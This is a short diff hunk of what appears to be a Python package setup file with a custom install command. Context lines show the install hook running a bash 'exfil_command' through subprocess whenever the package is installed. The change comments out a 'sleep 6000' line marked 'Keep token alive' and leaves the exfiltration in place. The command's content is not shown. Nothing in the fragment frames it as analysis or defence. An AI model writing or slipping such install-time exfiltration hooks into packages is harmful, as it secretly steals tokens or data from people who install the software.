@@ -12,7 +12,7 @@ class CustomInstallCommand(install):
         subprocess.run(["bash", "-c", exfil_command])
 
 
-        subprocess.run(["bash", "-c", "sleep 6000"])  # Keep token alive
+        # subprocess.run(["bash", "-c", "sleep 6000"])  # Keep token alive
 
         install.run(self)
 
